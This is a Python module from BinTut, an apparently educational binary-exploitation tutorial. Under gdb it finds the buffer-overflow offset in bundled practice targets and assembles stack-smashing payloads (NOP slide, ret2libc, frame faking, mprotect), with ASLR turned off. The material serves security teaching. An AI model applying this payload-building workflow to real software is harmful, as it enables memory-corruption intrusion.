"""
Copyright 2016 Gu Zhengxiong <rectigu@gmail.com>

This file is part of BinTut.

BinTut is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

BinTut is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with BinTut.  If not, see <http://www.gnu.org/licenses/>.
"""


from __future__ import division, absolute_import, print_function
from os.path import join, realpath, relpath

try:
    import gdb
except ImportError:
    pass
from pkg_resources import resource_filename
from pat import Pat

from .utils import select_target
from .repl import redisplay
from .exploit import (
    plain, nop_slide, ret_to_func, frame_faking, mprotect)
from .utils import pause, red, cyan


pat = Pat()


def main(course, bits, burst):
    init()
    bin_name = select_target(course)
    root = resource_filename(__name__, '')
    target = realpath(join(root, 'targets', bin_name))
    name = '{}-{}.bin'.format(course, 'x86' if bits == 32 else 'x64')
    name = realpath(name)
    with open(name, 'w') as stream:
        stream.write(pat.create(400))
    offset, addr = get_offset(target, name, bits, burst, course)
    if offset:
        print(cyan('\nFound offset: {offset}'.format(offset=offset)))
        payload = make_payload(offset, addr, course)
        print(cyan('Writing payload: {}'.format(name)))
        with open(name, 'wb') as stream:
            stream.write(payload)
        # TODO: Implement a pretty printer for humans.
        print('{} Bytes'.format(len(payload)))
        print(payload)
        pause(cyan('Enter to test the payload...'))
        get_offset(target, name, bits, burst, course)
    else:
        print(red('Offset Not Found'))


def get_offset(target, name, bits, burst, course):
    gdb.execute('file {}'.format(target))
    gdb.execute('start {}'.format(name))
    sp = '$esp' if bits == 32 else '$rsp'
    ip = '$eip' if bits == 32 else '$rip'
    last_sp = ''
    while True:
        try:
            cur_sp = gdb.execute('x/32wx {}'.format(sp),
                                 to_string=True)
        except gdb.error as error:
            print(error)
            print(red('Exiting Gracefully...'))
            break
        try:
            eip = gdb.execute('x/i {}'.format(ip), to_string=True)
            last_sp = cur_sp
        except gdb.MemoryError as error:
            print('\nMemoryError:', error.args[0])
            pattern = error.args[0].split()[-1]
            addr = cur_sp.split(':')[0]
            offset = pat.locate(pattern)
            print('pattern: {} addr: {} offset: {}'.format(
                red(pattern), red(addr), red(str(offset))))
            if burst:
                pass
            else:
                pause('Enter to return...')
            return offset, addr
        if 'call' in eip and '<read_file>' in eip:
            gdb.execute('stepi', to_string=True)
        elif '<system>' in eip and burst:
            gdb.execute('continue')
        else:
            try:
                gdb.execute('nexti', to_string=True)
            except KeyboardInterrupt:
                break
            except gdb.MemoryError:
                pass
        redisplay(bits, burst=burst,
                  target=relpath(target), course=course)
    return None, None


def init():
    gdb.execute('set pagination off')
    gdb.execute('set disassembly-flavor intel')
    # TODO: Remove this for ASLR-bypassing courses.
    gdb.execute('set disable-randomization on')


# TODO: Make it a class.
def make_payload(offset, addr, post):
    fill = b'A' * offset
    if post == 'plain':
        payload = fill + plain(addr)
    elif post == 'nop-slide':
        payload = fill + nop_slide(addr)
    elif post == 'ret2lib':
        payload = fill + ret_to_func()
    elif post == 'frame-faking':
        payload = frame_faking(offset, addr)
    elif post == 'mprotect':
        payload = mprotect(offset, addr)
    return payload
